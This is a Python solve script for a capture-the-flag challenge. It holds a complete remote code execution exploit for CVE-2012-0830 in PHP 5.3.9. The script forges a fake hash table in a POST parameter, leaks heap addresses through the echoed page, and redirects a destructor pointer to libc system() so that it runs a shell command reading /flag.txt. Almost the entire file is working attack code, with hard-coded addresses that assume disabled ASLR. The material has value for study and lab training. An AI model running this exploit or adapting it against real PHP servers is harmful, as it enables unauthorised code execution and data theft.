#!/usr/bin/env python3
"""
22 - hashdos-fix-rce  --  CVE-2012-0830 exploit.

PHP 5.3.9 shipped `max_input_vars` as the fix for the 28C3 hash-collision DoS
(CVE-2011-4885).  The check that enforces the limit inside
`php_register_variable_ex()` (main/php_variables.c) is wrong: when the limit is
hit for an *array* parameter the function skips the block that would create the
element but does NOT return, so it runs

        symtable1 = Z_ARRVAL_PP(gpc_element_p);

with a `gpc_element_p` that is stale -- it still points at the previous,
attacker-supplied *string* zval.  `Z_ARRVAL_PP` reinterprets the string's bytes
as a `HashTable *`, i.e. a fully attacker-controlled fake hash table.  The very
next `zend_symtable_update()` reaches `_zend_hash_index_update_or_next_insert()`
which calls `ht->pDestructor(p->pData)` -- an indirect call through a function
pointer we placed in the fake table.  Point it at libc `system` and we have RCE.

This script is Python-3 stdlib only.  It talks plain HTTP to the note-preview
app, whose only sink is `echo htmlspecialchars($_POST['note'])`.  That echo is
enough to (a) read memory that the corruption writes back into our note string
and (b) deliver the exploit.  It is fully self-calibrating for the heap layout;
the only baked-in constants are the two ASLR-off image bases (documented below),
which are deterministic because the challenge pins its toolchain and disables
ASLR (see the lab README / WRITEUP).

Usage:  solve.py [base_url]        default http://challenge
"""

import re
import struct
import sys
import time
import urllib.error
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://challenge"

# --- deterministic image bases (ASLR is disabled in the container) -----------
# php-cgi is a PIE; with ADDR_NO_RANDOMIZE it loads at the canonical base.
PHP_CGI_BASE = 0x555555554000
# libc from the pinned debian:bookworm-20250929-slim base image
# (libc6 2.36-9+deb12u13); with ASLR off and a fixed 8 MiB stack rlimit its
# mmap load address is stable run to run.
LIBC_BASE = 0x7FFFF7CFE000
LIBC_SYSTEM_OFF = 0x4C490          # readelf: system@@GLIBC_2.2.5
SYSTEM = LIBC_BASE + LIBC_SYSTEM_OFF

# An 8-byte slot inside php-cgi's own .bss.  It is part of the (pinned) binary
# image, is zero-initialised, and sits far enough into .bss to stay NULL at
# request-startup time.  Used as a known address holding a NULL `arBuckets[0]`.
ZERO_QWORD = PHP_CGI_BASE + 0x345000   # 0x555555899000, deep in .bss

BLOBLEN = 4096                     # size of the note = size of the fake table
NFILL = 1002                       # > max_input_vars (1000): trips the bug

# On the 64-bit build the fake HashTable is laid out to match struct _hashtable:
#   off  0  uint  nTableSize
#   off  4  uint  nTableMask     -> 0 so (h & mask) == 0, arBuckets[0] is used
#   off  8  uint  nNumOfElements -> 0 so it stays <= max_input_vars downstream
#   off 48  ptr   arBuckets
#   off 56  ptr   pDestructor    <- the indirect call target
HEAP_LO = 0x555555000000
HEAP_HI = 0x555560000000


def q(v):
    return struct.pack("<Q", v)


def d(v):
    return struct.pack("<I", v)


def enc(b):
    # fixed 3 chars per byte so every request body is exactly the same length
    return "".join("%%%02X" % c for c in b)


def make_blob(arbuckets=0, pdestructor=0, extra=None):
    b = bytearray(BLOBLEN)
    b[0:4] = d(BLOBLEN)            # nTableSize
    b[4:8] = d(0)                  # nTableMask
    b[8:12] = d(0)                 # nNumOfElements
    b[48:56] = q(arbuckets)
    b[56:64] = q(pdestructor)
    if extra:
        for off, data in extra:
            b[off:off + len(data)] = data
    return bytes(b)


def make_body(blob):
    # note=<fake table> & 1002 fillers & note[0]=zz
    # The fillers push the element count past max_input_vars; note[0]=zz is the
    # array insert that runs the buggy path with a stale gpc_element_p pointing
    # at the note string (our fake table).
    parts = ["note=" + enc(blob)]
    parts += ["f%d=1" % i for i in range(NFILL)]
    parts.append("note[0]=zz")
    return "&".join(parts).encode()


def unescape(b):
    # exact inverse of PHP 5.3 htmlspecialchars (ENT_COMPAT, ISO-8859-1):
    # only & < > and " are encoded, single quote is left as-is.
    return (b.replace(b"&lt;", b"<")
             .replace(b"&gt;", b">")
             .replace(b"&quot;", b'"')
             .replace(b"&amp;", b"&"))


def post(body):
    req = urllib.request.Request(
        BASE + "/", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        resp = urllib.request.urlopen(req, timeout=20)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:      # 500 = php-cgi child crashed
        return e.code, e.read()
    except Exception:
        return -1, b""


def preview(body):
    """Return the raw bytes php echoed back for our note (post-corruption)."""
    st, html = post(body)
    m = re.search(rb'<pre id="preview">(.*?)</pre>', html, re.S)
    if not m:
        return st, None
    return st, unescape(m.group(1))


def leak_heap_pointer():
    """
    Point arBuckets at a known NULL qword.  php allocates a fresh Bucket and,
    via CONNECT_TO_GLOBAL_DLLIST, writes its address into our fake table's
    pListHead/pListTail (offsets 24/32) which live in the echoed note string.
    """
    st, pv = preview(make_body(make_blob(arbuckets=ZERO_QWORD)))
    if not pv or len(pv) < 40:
        return None
    ptr = struct.unpack("<Q", pv[24:32])[0]
    return ptr if HEAP_LO < ptr < HEAP_HI else None


def locate_note(bucket):
    """
    Self-locate the note string's address.  We sweep arBuckets downward from the
    leaked heap pointer; whenever it lands inside our own note buffer, php writes
    the freshly-allocated Bucket pointer at `*(arBuckets)`, i.e. into the echoed
    note at offset (arBuckets - note).  Reading that offset back gives us the
    absolute address of the note.
    """
    base = bucket & ~0x7FF
    floor = bucket - 0x60000
    while base > floor:
        st, pv = preview(make_body(make_blob(arbuckets=base)))
        if pv and len(pv) >= BLOBLEN:
            for off in range(64, BLOBLEN - 8, 8):
                v = struct.unpack("<Q", pv[off:off + 8])[0]
                if HEAP_LO < v < HEAP_HI:
                    return base - off
        base -= 0x800
    return None


def exploit(note_addr, command):
    """Fire the indirect call: pDestructor = system, argument = `command`."""
    extra = [
        (72,  q(note_addr + 128)),           # arBuckets[0] -> fake Bucket
        (128, q(0)),                         # bucket.h = 0        (matches h==0)
        (136, d(0)),                         # bucket.nKeyLength=0 (numeric key)
        (144, q(note_addr + 152)),           # bucket.pData -> command string
        (152, command.encode() + b"\x00"),
    ]
    blob = make_blob(arbuckets=note_addr + 72, pdestructor=SYSTEM, extra=extra)
    return post(make_body(blob))


# The corruption happens during request startup, BEFORE php-cgi emits its own
# CGI headers.  So system()'s stdout is the first thing on the CGI pipe: we make
# it a valid header block followed by the flag, and Apache hands it straight back
# as the HTTP response body.
EXFIL = "printf 'Content-Type: text/plain\\n\\nFLAG_BEGIN:'; cat /flag.txt; printf ':FLAG_END\\n'"


def main():
    print("[*] target: %s" % BASE)
    print("[*] CVE-2012-0830: max_input_vars fix -> stale gpc_element_p -> "
          "string/HashTable type confusion -> pDestructor call")

    for attempt in range(1, 6):
        print("[*] attempt %d" % attempt)

        bucket = None
        for _ in range(5):
            bucket = leak_heap_pointer()
            if bucket:
                break
        if not bucket:
            print("[-] heap leak failed, retrying")
            time.sleep(1)
            continue
        print("[+] leaked heap pointer: 0x%x" % bucket)

        note_addr = locate_note(bucket)
        if not note_addr:
            print("[-] could not locate note string, retrying")
            continue
        print("[+] note string (fake HashTable) @ 0x%x" % note_addr)
        print("[+] calling system() @ 0x%x through fake pDestructor" % SYSTEM)

        st, body = exploit(note_addr, EXFIL)
        m = re.search(rb"FLAG_BEGIN:(PHRACK\{[^}]*\})", body)
        if not m:
            m = re.search(rb"(PHRACK\{[^}]*\})", body)
        if m:
            flag = m.group(1).decode()
            print("[+] remote code execution as www-data confirmed")
            print("FLAG: %s" % flag)
            return 0
        print("[-] no flag in response (status %d), retrying" % st)

    print("[-] exploitation failed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
